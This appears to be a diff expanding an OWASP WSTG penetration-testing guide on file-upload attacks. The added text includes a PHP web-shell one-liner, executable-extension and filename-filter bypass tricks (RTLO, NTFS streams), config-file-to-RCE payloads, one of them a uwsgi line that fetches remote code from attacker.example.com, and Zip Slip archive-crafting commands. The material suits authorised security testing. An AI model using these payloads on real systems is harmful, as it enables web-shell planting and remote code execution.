@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [business-logic, workflow, abuse, wstg, busl]
 tech_stack: []
 cwe_ids: [CWE-840]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-busl-01, wstg-busl-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-busl-02: "Missing CSRF/request-integrity protection on the upload endpoint combined with acceptance of dangerous extensions (.php, .jsp) lets an attacker forge a request that tricks a logged-in admin's browser into uploading a web shell — CSRF-to-RCE (Critical)"
 ---
 
 # wstg-busl-08
@@ -289,7 +290,107 @@ AddType application/x-httpd-php .jpg
 
 // Short tags
 <?=`$_GET[0]`?>
+
+// Script-tag alternative (no <?php or <?= needed — bypasses naive tag filters)
+<script language="php">system($_GET['cmd']);</script>
 ```
+
+### Extended Dangerous Extension Lists (by backend)
+
+Beyond the common `.php/.asp/.jsp` extensions, test these lesser-known executable extensions per backend — WAFs/blocklists frequently miss them:
+
+| Backend      | Extensions to try                                                                 |
+| ------------ | ---------------------------------------------------------------------------------- |
+| PHP          | `.php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc`          |
+| ASP (IIS)    | `.asp .aspx .config .cer` (IIS<=7.5) `.asa` (IIS<=7.5) `shell.aspx;1.jpg` (IIS<7.0) `.soap` |
+| JSP          | `.jsp .jspx .jsw .jsv .jspf .wss .do .actions`                                    |
+| Perl         | `.pl .pm .cgi .lib`                                                                |
+| ColdFusion   | `.cfm .cfml .cfc .dbm`                                                             |
+| Node.js      | `.js .json .node`                                                                  |
+
+Non-executable extensions that still enable secondary attacks: `.svg` (XXE/XSS/SSRF), `.gif` (XSS), `.csv` (CSV injection), `.xml` (XXE), `.avi` (LFI/SSRF), `.zip` (RCE/DoS/LFI gadget via extraction), `.html` (XSS/open redirect).
+
+### Additional Extension/Filename Bypass Tricks
+
+```bash
+# Reverse double extension — exploits Apache configs where anything
+# containing .php (not necessarily ending in it) executes as PHP
+cp shell.php "shell.php.jpg"
+
+# Multiple trailing dots — Windows strips trailing dots on file creation
+cp shell.php "shell.php......"
+
+# Whitespace / newline variants
+cp shell.php "shell.php%20"
+cp shell.php "shell.php%0a"
+printf 'shell.php\r\n.jpg' # shell.php%0d%0a.jpg via Content-Disposition filename
+
+# Right-to-Left Override (RTLO) — renders as "shell.gpj.php" but the
+# underlying bytes bypass extension filters expecting "*.php" at the end
+# Insert %E2%80%AE before the fake extension in the filename param:
+#   Content-Disposition: form-data; name="file"; filename="shellphp.%E2%80%AEgpj.jpg"
+
+# NTFS Alternate Data Stream (Windows) — creates an empty file with the
+# forbidden extension, appended data stream carries the permitted one
+# filename="file.asax:.jpg"  or  filename="file.asp::$data."
+
+# UTF-8 filename smuggling via Content-Disposition
+# Content-Disposition: form-data; name="file"; filename*=UTF8''shell%0a.php
+```
+
+### Configuration-File Upload to RCE
+
+If the target lets you control filenames/extensions arbitrarily, uploading a server config file can achieve code execution even when script extensions are blocked:
+
+```apache
+# Apache .htaccess — remap an unfiltered extension to PHP execution
+AddType application/x-httpd-php .rce
+# Then upload any file as shell.rce
+```
+
+```ini
+# uWSGI uwsgi.ini — "magic" @() operators evaluated on config (re)load
+[uwsgi]
+; execute a command and use its stdout as a value
+body = @(exec://id)
+; fetch and execute remote content
+test = @(http://attacker.example.com/payload)
+```
+
+```js
+// package.json — npm install/prepare hook RCE
+"scripts": { "prepare": "/bin/touch /tmp/pwned.txt" }
+
+// composer.json — composer install hook RCE
+"scripts": { "pre-command-run": ["/bin/touch /tmp/pwned.txt"] }
+```
+
+See [PayloadsAllTheThings - Configuration Apache .htaccess / IIS web.config / uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) for ready-made config payload files.
+
+### Zip Slip - Archive Path Traversal on Extraction (from PayloadsAllTheThings)
+
+If the upload feature accepts and *server-side extracts* archives (zip/tar/jar/war/apk/7z), a distinct vulnerability class applies beyond dangerous-extension filtering: a crafted archive whose entry filenames contain `../` sequences can write files outside the intended extraction directory during unzip, overwriting arbitrary files or planting a web shell in a predictable, executable location.
+
+```bash
+# Generate a malicious archive that traverses out of the extraction dir using evilarc
+git clone https://github.com/ptoomey3/evilarc
+python3 evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
+
+# Manually craft a traversal entry with zip (requires a zip binary that preserves ../ in entry names)
+mkdir -p payload && cd payload
+touch "../../../../var/www/html/shell.php"
+zip --symlinks ../malicious.zip "../../../../var/www/html/shell.php"
+
+# Symlink-based variant: archive a symlink pointing outside the extraction root, which some
+# extractors follow and write through
+ln -s ../../../index.php symindex.txt
+zip --symlinks test.zip symindex.txt
+
+# Upload the crafted archive to the extraction endpoint
+curl -s -X POST "https://{target}/api/upload" -H "Authorization: Bearer $TOKEN" -F "file=@malicious.zip"
+```
+
+Detection pattern: after upload, probe for the planted file at the traversed target path (e.g. `curl https://{target}/shell.php`) — if reachable/executable, the archive extractor did not sanitize `../` in entry names (CWE-22 combined with CWE-434 when the target is executable). See `snyk/zip-slip-vulnerability` for the list of libraries/languages historically affected (Java `java.util.zip`, various Node/Python/Go/Ruby archive libraries) to prioritize testing based on the detected backend.
 
 ### Upload Test Script
 
@@ -616,6 +717,7 @@ location /uploads {
 - [OWASP WSTG - Test Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
 - [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
 - [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+- [PayloadsAllTheThings - Zip Slip](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Zip%20Slip)
 
 
 ---
